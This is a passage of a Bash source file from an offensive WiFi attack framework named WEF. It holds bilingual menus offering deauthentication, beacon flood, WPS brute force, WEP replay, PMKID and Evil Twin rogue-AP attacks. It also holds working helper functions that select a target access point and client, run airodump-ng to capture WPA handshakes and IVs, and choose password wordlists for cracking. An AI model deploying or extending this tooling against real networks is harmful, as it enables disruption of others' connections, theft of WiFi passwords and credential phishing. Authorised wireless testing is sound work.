    echo -e "\n${blueC}---------${yC}Ataques DoS${blueC}---------\t--------${yC}Ataques WEP${blueC}---------\t-----${yC}Ataques Rogue AP${blueC}-----${endC}"
    echo -e "${blueC}[${yC}1${blueC}] Ataque de deautenticación\t[${yC}9${blueC}]  Ataque ARP Replay\t\t[${yC}16${blueC}] Ataque EvilTwin${endC}"
    echo -e "${blueC}[${yC}2${blueC}] Ataque de confusión WIDS\t[${yC}10${blueC}] Ataque HIRTE${endC}"
    echo -e "${blueC}[${yC}3${blueC}] Ataque de autenticación\t[${yC}11${blueC}] Ataque Caffe Latte${endC}"
    echo -e "${blueC}[${yC}4${blueC}] Ataque Beacon Flood\t\t[${yC}12${blueC}] Ataque de falsa auth.${endC}"
    echo -e "${blueC}[${yC}5${blueC}] Ataque TKIP${endC}"
    echo -e "\n${blueC}--------${yC}Ataques WPS${blueC}----------\t----${yC}Ataques de Handshake${blueC}----${endC}"
    echo -e "${blueC}[${yC}6${blueC}] Ataque Pixie Dust\t\t[${yC}13${blueC}] Ataque de captura WPA/2 (sin deauth)${endC}"
    echo -e "${blueC}[${yC}7${blueC}] Ataque de fuerza bruta\t[${yC}14${blueC}] Ataque PMKID${endC}"
    echo -e "${blueC}[${yC}8${blueC}] Ataque de PIN nulo\t\t[${yC}15${blueC}] Modo Pwnagotchi${endC}"
  fi
}

# Commands help panel
function commands_panel(){
  if [ "$lang" == "en" ]; then
    echo -e "\n   ${yC}COMMANDS:${endC}"

    echo -e "\n\t${yC}NETWORK ADAPTER:${endC}"
    echo -e "${blueC}\t enable\t\t\tenable monitor mode for especified network interface${endC}"
    echo -e "${blueC}\t disable\t\tdisable monitor mode and enable managed mode for especified network interface${endC}"
    echo -e "${blueC}\t mac\t\t\tchange interface MAC with a custom or random address${endC}"
    echo -e "${blueC}\t check_vif\t\tcheck if your network adapter supports VIF (Virtual Interface)${endC}"

    echo -e "\n\t${yC}ACCESS POINTS:${endC}"
    echo -e "${blueC}\t scan\t\t\t\tscan nearby access points${endC}"
    echo -e "${blueC}\t list_aps\t\t\tlist already scanned APs${endC}"
    echo -e "${blueC}\t inhibit <bssid> <channel>\tinhibit connections of an AP until you press Ctrl+C (deauth all clients)${endC}"
    echo -e "${blueC}\t graph <file.csv> <output.png>\tcreate a graph (using airgraph-ng) of APs and its devices (especify an airodump-ng csv file)${endC}"

    echo -e "\n\t${yC}HANDSHAKES:${endC}"
    echo -e "${blueC}\t check <file.cap>\t\t\tcheck if given capture file contains at least one WPA or PMKID handshake${endC}"
    echo -e "${blueC}\t crack <file.cap> <wordlist.txt>\tcrack given handshake with given wordlist using aircrack-ng${endC}"
    echo -e "${blueC}\t john <file.cap> <wordlist.txt>\t\tcrack given handshake with given wordlist using john the ripper${endC}"
    echo -e "${blueC}\t hashcat <file.cap> <wordlist.txt>\tcrack given handshake with given wordlist using hashcat${endC}"
    echo -e "${blueC}\t convert <file.cap> <output.hc22000>\tconvert given capture file to hashcat crackeable format"

    echo -e "\n\t${yC}INFORMATIVE:${endC}"
    echo -e "${blueC}\t identify <mac>\t\tprint vendor of given MAC address (i.e. D0:37:45:37:B5:6D -> TP-LINK)"
    echo -e "${blueC}\t info\t\t\tshow info about the network adapter interface${endC}"
    echo -e "${blueC}\t panel\t\t\tdisplay attack options panel${endC}"
    echo -e "${blueC}\t attacks\t\tshow info about the available attacks${endC}"
    echo -e "${blueC}\t chipsets\t\tlist chipsets that support monitor mode${endC}"

    echo -e "\n\t${yC}CONFIG:${endC}"
    echo -e "${blueC}\t update\t\t\tcheck if an update is available and ask you to install it${endC}"
    echo -e "${blueC}\t edit\t\t\tedit config file using default text editor (re-execute tool to apply changes)${endC}"
    echo -e "${blueC}\t clear/cls\t\tclear the screen${endC}"
    echo -e "${blueC}\t version\t\tprint the info about the version of wef${endC}"
    echo -e "${blueC}\t exit/quit\t\texit the framework${endC}"
    echo -e "${blueC}\t help/?\t\t\tprint this help panel${endC}"
  elif [ "$lang" == "es" ]; then
    echo -e "\n   ${yC}COMANDOS:${endC}"

    echo -e "\n\t${yC}ADAPTADOR DE RED:${endC}"
    echo -e "${blueC}\t enable\t\t\thabilita el modo monitor en la interfaz de red especificada${endC}"
    echo -e "${blueC}\t disable\t\tdesactiva el modo monitor y habilita el modo managed en la interfaz de red especificada${endC}"
    echo -e "${blueC}\t mac\t\t\tcambia la MAC de la interfaz por una dirección concreta o una aleatoria${endC}"
    echo -e "${blueC}\t check_vif\t\tcomprueba si tu adaptador de red soporta VIF (Interfaz Virtual)${endC}"

    echo -e "\n\t${yC}PUNTOS DE ACCESO:${endC}"
    echo -e "${blueC}\t scan\t\t\t\tescanea los puntos de acceso cercanos${endC}"
    echo -e "${blueC}\t list_aps\t\t\tmuestra la lista de los APs escaneados${endC}"
    echo -e "${blueC}\t inhibit <bssid> <channel>\tinhibe las conexiones de un AP hasta que presiones Ctrl+C (deautentica a todos los clientes)${endC}"
    echo -e "${blueC}\t graph <file.csv> <output.png>\tcrea un gráfico (usando airgraph-ng) sobre los APs y sus clientes (especifica un archivo csv de airodump-ng)${endC}"

    echo -e "\n\t${yC}HANDSHAKES:${endC}"
    echo -e "${blueC}\t check <file.cap>\t\t\tcomprueba si el archivo especificado contiene al menos un handshake WPA o PMKID${endC}"
    echo -e "${blueC}\t crack <file.cap> <wordlist.txt>\tcrackea el handshake dado con la wordlist especificada usando aircrack-ng${endC}"
    echo -e "${blueC}\t john <file.cap> <wordlist.txt>\t\tcrackea el handshake dado con la wordlist especificada usando john the ripper${endC}"
    echo -e "${blueC}\t hashcat <file.cap> <wordlist.txt>\tcrackea el handshake dado con la wordlist especificada usando hashcat${endC}"
    echo -e "${blueC}\t convert <file.cap> <output.hc22000>\tconvierte el archivo de captura a un formato crackeable con hashcat"

    echo -e "\n\t${yC}INFORMATIVO:${endC}"
    echo -e "${blueC}\t identify <mac>\t\tmuestra el vendor de la dirección MAC proporcionada (e.g. D0:37:45:37:B5:6D -> TP-LINK)"
    echo -e "${blueC}\t info\t\t\tmuestra información sobre la interfaz del adaptador de red${endC}"
    echo -e "${blueC}\t panel\t\t\tmuestra el panel con las opciones de los ataques${endC}"
    echo -e "${blueC}\t attacks\t\tmuestra info sobre los ataques disponibles${endC}"
    echo -e "${blueC}\t chipsets\t\tlista los chipsets que soportan modo monitor${endC}"

    echo -e "\n\t${yC}CONFIG:${endC}"
    echo -e "${blueC}\t update\t\t\tcomprueba si hay alguna actualización disponible y la instala${endC}"
    echo -e "${blueC}\t edit\t\t\tedita el archivo de config usando el editor de texto predeterminado (reejecuta WEF para aplicar los cambios)${endC}"
    echo -e "${blueC}\t clear/cls\t\tlimpia la pantalla${endC}"
    echo -e "${blueC}\t version\t\timprime la versión actual de la herramienta${endC}"
    echo -e "${blueC}\t exit/quit\t\tsalir del framework${endC}"
    echo -e "${blueC}\t help/?\t\t\timprime este panel de ayuda${endC}"
  fi
}

function evil_twin_panel() {
  if [ "$lang" == "en" ]; then
    color_output "1" "Rogue AP + Captive Portal"
    color_output "2" "Rogue AP + Captive Portal + DoS"
    color_output "3" "Rogue AP + Captive Portal + WiFi Enterprise"
    color_output "4" "Rogue AP + Captive Portal + WiFi Enterprise + DoS"
  else
    color_output "1" "Rogue AP + Portal Cautivo"
    color_output "2" "Rogue AP + Portal Cautivo + DoS"
    color_output "3" "Rogue AP + Portal Cautivo + WiFi Enterprise"
    color_output "4" "Rogue AP + Portal Cautivo + WiFi Enterprise + DoS"
  fi
}

# Chipsets for monitor mode
function chipsets_panel(){
  echo -e "\n\t${yC}Chipsets"
  echo -e "\t--------${blueC}"
  echo -e "\tRTL8812AU"
  echo -e "\tAR9271"
  echo -e "\tMT7610U"
  echo -e "\tMT7612U"
  echo -e "\tRTL8814U"
  echo -e "\tRTL8188EUS${endC}"
  color_output_ln "*" "${netCard} chipset: ${yC}${chipset}${endC}"
}




#
# Auxiliar functions to ask data to user (ESSID, BSSID, attack time, frames to send...)
#

function ask_target(){
  while true; do
    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "Introduce the number of the AP you want to attack: " && read number
    else
      color_output_no_line "*" "Introduce el número del AP que quieras atacar: " && read number
    fi

    if [ ! "$number" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "${grayC}Introduce a valid number${endC}"
      else
        echo -e "${grayC}Introduce un número valido${endC}"
      fi
      continue
    elif [ "$number" == "exit" ] || [ "$number" == "quit" ]; then
      ctrl_c
    elif [ "$number" == "back" ]; then
      break
    elif [[ $number =~ ^[0-9]+$ ]]; then
      break
    else
      if [ "$lang" == "en" ]; then
        echo -e "${grayC}Introduce a valid number${endC}"
      else
        echo -e "${grayC}Introduce un número valido${endC}"
      fi
      continue
    fi
  done
}

function ask_target_client(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Introduce the number of the client you want to attack: " && read client_number
  else
    color_output_no_line "*" "Introduce el número del cliente que quieras atacar: " && read client_number
  fi

  if [ "${client_number}" == "exit" ] || [ "${client_number}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for BSSID
function ask_bssid(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Introduce BSSID of the target AP: " && read ap_bssid
  else
    color_output_no_line "*" "Introduce la BSSID del AP objetivo: " && read ap_bssid
  fi

  if [ "${ap_bssid}" == "exit" ] || [ "${ap_bssid}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for attack duration
function ask_time(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Introduce attack duration (default=${default}): " && read attack_time
  else
    color_output_no_line "*" "Introduce la duración del ataque (por defecto=${default}): " && read attack_time
  fi

  if [ "${attack_time}" == "exit" ] || [ "${attack_time}" == "quit" ]; then
    ctrl_c
  fi

  if [ ! "${attack_time}" ]; then
    attack_time="${default}"
  fi

  if [[ ${attack_time} =~ [^0-9ms] ]] && [ "${attack_time}" != "back" ]; then
    if [ "$lang" == "en" ]; then
      color_output "X" "Invalid attack duration!"
    else
      color_output "X" "Duración inválida!"
    fi

    ask_time
  fi

}

# Ask amount of deuth frames to send
function ask_frames(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Amount of deauth frames to send (default=${default}): " && read frames_to_send
  else
    color_output_no_line "*" "Cantidad de paquetes de deautenticación a enviar (por defecto=${default}): " && read frames_to_send
  fi

  if [ ! "$frames_to_send" ]; then
    frames_to_send="${default}"
  fi

  if [ "$frames_to_send" == "exit" ] || [ "$frames_to_send" == "quit" ]; then
    ctrl_c
  fi
}

# Ask user to capture handshakes
function ask_to_capture_handshakes(){
  if [ "$lang" == "en" ]; then
    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture handshakes? (default=yes) (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read c_hand
  else
    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los handshakes? (por defecto=sí) (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read c_hand
  fi

  if [ "$c_hand" == "exit" ] || [ "$c_hand" == "quit" ]; then
    ctrl_c
  fi

  # Check user input to start airodump or not
  if [ "$c_hand" == "y" ] || [ "$c_hand" == "yes" ] || [ "$c_hand" == "s" ] || [ "$c_hand" == "si" ] || [ ! "$c_hand" ]; then
    if [ "$airmon_check_kill" == "true" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "${grayC}Do not close airodump-ng window, it will be closed once the attack ends${endC}"
      else
        echo -e "${grayC}No cierres la ventana de airodump-ng, se cerrará una vez que el ataque termine${endC}"
      fi
    else
      if [ "$lang" == "en" ]; then
        echo -e "${grayC}Airodump-ng launched in background, it will be closed once the attack ends${endC}"
      else
        echo -e "${grayC}Airodump-ng iniciado en background, se cerrará una vez que el ataque termine${endC}"
      fi
    fi; sleep 0.2

    c_h="true"
    cap_name=$(date +"%Y-%m-%d-%H-%M-%S")

    if [ ! -d "/usr/share/wef/main/captures" ]; then
      mkdir "/usr/share/wef/main/captures" 2>/dev/null
    fi

    if [ "$airmon_check_kill" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard}" 2>/dev/null &
    else
      airodump-ng -c ${channel} -w "/usr/share/wef/main/captures/${ap_dir}/${cap_name}" --bssid "${ap_bssid}" ${netCard} &>/dev/null &
    fi

    airodump_PID=$!
  else
    c_h="false"
  fi
}

# Ask user to capture IVs
function ask_to_capture_ivs(){
  if [ "$lang" == "en" ]; then
    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture IVs? (default=yes) (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read c_ivs
  else
    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los IVs? (por defecto=sí) (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read c_ivs
  fi

  if [ "$c_ivs" == "exit" ] || [ "$c_ivs" == "quit" ]; then
    ctrl_c
  fi

  # Check user input to start airodump or not
  if [ "$c_ivs" == "y" ] || [ "$c_ivs" == "yes" ] || [ "$c_ivs" == "s" ] || [ "$c_ivs" == "si" ] || [ ! "$c_ivs" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}Do not close airodump-ng window, it will be closed automatically${endC}"
    else
      echo -e "${blueC}No cierres la ventana de airodump-ng, se cerrará automaticamente${endC}"
    fi; sleep 0.2

    c_i="true"
    cap_name=$(date +"%Y-%m-%d-%H-%M-%S")

    if [ ! -d "/usr/share/wef/main/captures" ]; then
      mkdir "/usr/share/wef/main/captures"
    fi

    if [ "$airmon_check_kill" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --essid \"${essid}\" ${netCard}" 2>/dev/null &
    else
      airodump-ng -c ${channel} -w "/usr/share/wef/main/captures/${ap_dir}/${cap_name}" --essid "${essid}" ${netCard} &
    fi

    airodump_PID=$!
  else
    c_i="false"
  fi
}

# Ask user for new interface name if it has changed when enabling monitor mode
function ask_new_name(){
  if [ "$lang" == "en" ]; then
    echo -e "${blueC}\nIn new interfaces nomenclature, names change after enabling monitor mode${endC}"
    echo -ne "${blueC}[${yC}*${blueC}] Interface name has changed, how is it called now?: ${endC}" && read new_name
  else
    echo -e "${blueC}\nCon la nueva nomenclatura de las interfaces, los nombre cambian despues de activar el modo monitor${endC}"
    echo -ne "${blueC}[${yC}*${blueC}] El nombre de la interfaz ha cambiado, ¿como se llama ahora?: ${endC}" && read new_name
  fi

  if [ ! -d "/sys/class/net/${new_name}" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "X" "Especified interface does not exist!"
    else
      color_output_ln "X" "La interfaz especificada no existe!"
    fi
    ask_new_name
  fi

  evilCard=${netCard}
  netCard=${new_name}
  ip link set "${netCard}" up 2>/dev/null; sleep 0.2
}

# Ask for AP BSSID if name is duplicated
function ask_name_duplicate(){
  cat /usr/share/wef/cache/wps_scan.txt | grep "${essid}$"
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Multiple APs found with that name, enter its BSSID: " && read ap_bssid
  else
    color_output_no_line "*" "Múltiples APs encontrados con ese nombre, introduce su BSSID: " && read ap_bssid
  fi

  if [ "$ap_bssid" == "exit" ] || [ "$ap_bssid" == "quit" ]; then
    ctrl_c
  fi
}

function ask_to_crack_handshakes(){
  if [ "${c_h}" == "true" ]; then
    if [ "$(check_handshake)" -gt "0" ]; then
      if [ "$lang" == "en" ]; then
        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack WPA/WPA2 handshakes? This process will take a long time (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
      else
        echo -ne "\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes WPA/WPA2? Este proceso tardará bastante tiempo (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
      fi
    elif [ "$(check_handshake)" -le "0" ] && [ "$(check_pmkid_handshake)" == "true" ]; then
      if [ "$lang" == "en" ]; then
        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack PMKID handshakes? This process will take a long time (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
      else
        echo -ne "\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes PMKID? Este proceso tardará bastante tiempo (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
      fi
    fi
  fi
}

# Ask the user to select a wordlist
function ask_dict(){
  if [ -d "/usr/share/wef/main/wordlists/" ] && [ -f "/usr/share/wef/main/wordlists/rockyou.txt" ] && [ -f "/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt" ] && [ -f "/usr/share/wef/main/wordlists/darkweb2017-top10000.txt" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "+" "Available wordlists:"
      echo -e "${blueC}If you want to use a custom dictionary enter its full path${endC}"
      echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
      echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
      echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
      color_output_no_line "*" "Select a wordlist to use: " && read dic_option
    else
      color_output_ln "+" "Diccionarios disponibles:"
      echo -e "${blueC}Si quieres usar un diccionario personalizado escribe su ruta completa${endC}"
      echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
      echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
      echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
      color_output_no_line "*" "Selecciona un diccionario: " && read dic_option
    fi

    if [ "$dic_option" == "1" ] || [ "$dic_option" == "rockyou" ] || [ "$dic_option" == "rockyou.txt" ]; then
      wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"

    elif [ "$dic_option" == "2" ] || [ "$dic_option" == "probable" ] || [ "$dic_option" == "probable-v2-wpa-top4800.txt" ]; then
      wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"

    elif [ "$dic_option" == "3" ] || [ "$dic_option" == "darkweb" ] || [ "$dic_option" == "darkweb2017-top10000.txt" ]; then
      wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"

    elif [ -f "${dic_option}" ]; then
      wordlist_to_use="${dic_option}"

    elif [ "$dic_option" == "exit" ] || [ "$dic_option" == "quit" ]; then
      ctrl_c

    else
      if [ "$lang" == "en" ]; then
        echo -e "${blueC}Especified wordlist does not exist! Selecting rockyou.txt by default${endC}"
      else
        echo -e "${blueC}El diccionario especificado no existe! Seleccionando rockyou.txt por defecto${endC}"
      fi
      wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"

    fi
  else
    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Path to wordlist used to crack handshakes: " && read wordlist_to_use
      else
        color_output_no_line "*" "Ruta del diccionario usado para crackear los handshakes: " && read wordlist_to_use
      fi

      if [ "$wordlist_to_use" == "exit" ] || [ "$wordlist_to_use" == "quit" ]; then
        ctrl_c
      fi

      if [ -f "${wordlist_to_use}" ]; then
        break
      else
        if [ "$lang" == "en" ]; then
          color_output "X" "Wordlist not found"
        else
          color_output "X" "Diccionario no encontrado"
        fi
      fi
    done
  fi
}



#
# Extra auxiliary functions
#

function write_informative_log(){
  if [ ! -d "/usr/share/wef/main/logs" ]; then
    mkdir "/usr/share/wef/main/logs" 2>/dev/null
  fi

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    log_name="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    log_name="${ap_bssid}"
  fi

  if [ ! -f "/usr/share/wef/main/logs/${log_name}.log" ]; then
    touch "/usr/share/wef/main/logs/${log_name}.log"
  fi

  # Check empty essid
  if [ ! "${essid}" ]; then
    if [ "$lang" == "en" ]; then
      essid="Not especified"
    else
      essid="No especificado"
    fi
  fi

  # Check empty bssid
  if [ ! "${ap_bssid}" ]; then
    if [ "$lang" == "en" ]; then
      ap_bssid="Not especified"
    else
      ap_bssid="No especificado"
    fi
  fi

  # No channel
  if [ ! "${channel}" ]; then
    if [ "$lang" == "en" ]; then
      channel="Not especified"
    else
      channel="No especificado"
    fi
  fi

  # Duration not especified
  if [ ! "${attack_time}" ]; then
    if [ "$lang" == "en" ]; then
      attack_time="Not especified"
    else
      attack_time="No especificado"
    fi
  fi

  # Log file format
  if [ "$lang" == "en" ]; then
    echo -e "[WEF] WiFi Exploitation Framework
---------------------------------
Attack date: ${actual_date}
Attack type: ${type_of_attack}
Target access point: ${essid}
BSSID: ${ap_bssid}
Attack duration: ${attack_time}
AP channel: ${channel}
---------------------------------\n" >> "/usr/share/wef/main/logs/${log_name}.log" 2>/dev/null
  else
    echo -e "[WEF] WiFi Exploitation Framework
---------------------------------
Fecha del ataque: ${actual_date}
Tipo de ataque: ${type_of_attack}
Punto de acceso objetivo: ${essid}
BSSID: ${ap_bssid}
Duración del ataque: ${attack_time}
Canal del AP: ${channel}
---------------------------------\n" >> "/usr/share/wef/main/logs/${log_name}.log" 2>/dev/null
  fi
}

function parse_info(){
  aps="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"
  aps_length="$(echo "${aps}" | wc -l)"

  if [ -f "/usr/share/wef/cache/airodump-01.csv" ] && [[ $number -le $aps_length ]]; then
    essid=$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | tail -n +2 | sed "${number}q;d" | rev | cut -d "," -f1 | rev | sed 's/^[[:blank:]]*//')
    channel=$(echo "${aps}" | sed "${number}q;d" | awk '{print $2}')
    ap_bssid=$(echo "${aps}" | sed "${number}q;d" | awk '{print $1}')
    actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
    cap_name="$(date +"%Y-%m-%d-%H-%M-%S")"
  fi
}

function parse_info_wps(){
  channel=$(cat /usr/share/wef/cache/wps_scan.txt | grep "${ap_bssid}" | awk '{print $2}')
  essid="$(cat /usr/share/wef/cache/wps_scan.txt | grep "${ap_bssid}" | awk '{print $NF}')"
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
}

# Example: 00:C0:CA:B0:23:84
function get_vendor_from_mac(){
  mac_to_identify="$(echo "${1}" | tr '[:lower:]' '[:upper:]' | tr "-" ":")" # convert possible 00-C0-CA-B0-23-84 format to 00:C0:CA:B0:23:84
  macs_info="$(cat /usr/share/wef/vendors.json)"

  mac_1="$(echo "${mac_to_identify%?????????}")" # 00:C0:CA
  vendor="$(echo "${macs_info}" | jq -r '.[] | select(.macPrefix == "'"${mac_1}"'") | .vendorName' 2>/dev/null)"

  if [ "${vendor}" ]; then
    echo "${vendor}"
  else
    mac_2="$(echo "${mac_to_identify%???????}")" # 00:C0:CA:B
    vendor="$(echo "${macs_info}" | jq -r '.[] | select(.macPrefix == "'"${mac_2}"'") | .vendorName' 2>/dev/null)"

    if [ "${vendor}" ]; then
      echo "${vendor}"
    else
      mac_3="$(echo "${mac_to_identify%??????}")" # 00:C0:CA:B0
      vendor="$(echo "${macs_info}" | jq -r '.[] | select(.macPrefix == "'"${mac_3}"'") | .vendorName' 2>/dev/null)"

      if [ "${vendor}" ]; then
        echo "${vendor}"
      else
        echo "unknown"
      fi
    fi
  fi
}

function print_chipset(){
  if [ "$(check_interface_mode)" == "monitor" ]; then
    good_output "+" "Chipset: ${greenC}${chipset}"
  else
    good_output "+" "Chipset: ${grayC}${chipset}"
  fi
}

function check_vif(){
  iw list | grep "Supported interface modes" -A 8 | grep "AP/VLAN"
}

# Check the interface mode
function check_interface_mode(){
  iw dev ${netCard} info 2>/dev/null | grep 'type' | awk '{print $2}'
}

function check_monitor_type(){
  # Check if monitor mode was enabled using airmon-ng or iw
  if [ "$(echo "${netCard}" | grep "mon")" ]; then
    echo "airmon"
  else
    echo "iw"
  fi
}

function check_dups(){
  cat /usr/share/wef/cache/wps_scan.txt | grep "${essid}$"
}

function check_handshake(){
  total_amount=$(aircrack-ng "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")

  if [ "$total_amount" == "" ]; then
    echo 0
  else
    echo "${total_amount}"
  fi
}

function check_pmkid_handshake(){
  if [ "$(echo "1" | aircrack-ng "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep "PMKID")" ]; then
    echo "true"
  else
    echo "false"
  fi
}

function check_target_pmkid_handshake(){
  if [ "$(echo "1" | aircrack-ng "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep -i "${ap_bssid}" | grep "PMKID")" ]; then
    echo "true"
  else
    echo "false"
  fi
}

function check_handshakes_in_file(){
  total_amount=$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")
  
  if [ "$total_amount" == "" ]; then
    echo 0
  else
    echo "${total_amount}"
  fi
}

function check_target_handshakes_in_file(){
  total_amount=$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep -i "${ap_bssid}" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")
  
  if [ "$total_amount" == "" ]; then
    echo 0
  else
    echo "${total_amount}"
  fi
}

# Check if at least 1 handshake has been captured
function check_captured_handshakes(){
  if [ "$(check_handshake)" -gt "0" ] && [ "$(check_pmkid_handshake)" == "false" ]; then
    if [ "$lang" == "en" ]; then
      good_output "+" "$(check_handshake) WPA/WPA2 handshakes captured"
    else
      good_output "+" "$(check_handshake) handshakes WPA capturados"
    fi
  elif [ "$(check_handshake)" -le "0" ] && [ "$(check_pmkid_handshake)" == "true" ]; then
    if [ "$lang" == "en" ]; then
      good_output "*" "No WPA handshake was captured but a PMKID handshake was captured"
    else
      good_output "*" "No se capturó ningún handshake WPA pero sí se capturó un handshake PMKID"
    fi
  elif [ "$(check_handshake)" -gt "0" ] && [ "$(check_pmkid_handshake)" == "true" ]; then
    if [ "$lang" == "en" ]; then
      good_output "+" "$(check_handshake) WPA handshake captured, PMKID handshake have been captured too"
    else
      good_output "+" "$(check_handshake) handshakes WPA capturados, el handshake PMKID ha sido capturados también"
    fi
  elif [ "$(check_handshake)" -le "0" ] && [ "$(check_pmkid_handshake)" == "false" ]; then
    if [ "$lang" == "en" ]; then
      color_output "*" "Neither WPA/WPA2 nor PMKID handshakes were captured"
    else
      color_output "*" "Ningún handshake WPA/WPA2 ni PMKID ha sido capturado"
    fi
  fi
}

function print_available_handshakes(){
  target="$(echo "1" | aircrack-ng "${1}" | grep "WPA")"

  if [ "$(echo "${target}" | wc -l)" -gt 1 ]; then
    echo -e "\n${target}" | sed 's/^....//'
  else
    if [ "$lang" == "en" ]; then
      good_output_ln "+" "File contains $(check_handshakes_in_file "${1}") WPA handshakes"

      if [ "$(echo "1" | aircrack-ng "${1}" | grep "WPA" | grep "PMKID")" ]; then
        good_output "+" "File contains at least one PMKID handshake"
      else
        good_output "+" "File doesn't contain a PMKID handshake"
      fi
    else
      good_output_ln "+" "El archivo contiene $(check_handshakes_in_file "${1}") handshakes WPA"

      if [ "$(echo "1" | aircrack-ng "${1}" | grep "WPA" | grep "PMKID")" ]; then
        good_output "+" "El archivo contiene al menos un handshake PMKID"
      else
        good_output "+" "El archivo no contiene ningún handshake PMKID"
      fi
    fi
  fi
}

function create_graph(){
  if [ ! -d "/usr/share/wef/main/graphs" ]; then
    mkdir "/usr/share/wef/main/graphs"
  fi

  if [ "${create_graph}" == "true" ] && [ "$(command -v airgraph-ng)" ]; then
    airgraph-ng -g CAPR -i "${1}" -o "${2}" &>/dev/null &
    sleep 0.2

    if [ "$lang" == "en" ]; then
      color_output "*" "Graph saved as ${2}"
    else
      color_output "*" "Gráfico guardado como ${2}"
    fi
  fi
}

function check_and_create(){
  if [ ! -d "${1}" ]; then
    mkdir "${1}" 2>/dev/null
  fi
}

function move_capture_files(){
  # Remove useless files
  rm "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.log.csv"
  rm "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.kismet.csv"
  rm "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.kismet.netxml"

  # Rename main .csv and .cap file
  mv "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.csv" "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.csv"
  mv "/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.cap" "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
}

# Sets some important variables to "" (empty) to avoid errors and more
function reset_info(){
  channel=""
  essid=""
  attack_time=""
  frames_to_send=""
  ap_bssid=""
  catch_handshakes=""
  log_name=""
  c_h=""
  crack_option=""
  wordlist_to_use=""
  cap_name=""
  number=""
  client_number=""
  ctrl_c_pressed=""
  ap_dir=""
}

function list_interfaces(){
  color_output_ln "*" "Interfaces:"
  for i in /sys/class/net/*; do
    echo -e "\t${grayC}$(echo "${i}" | awk '{print $NF}' FS="/")${endC}"
  done
}

#
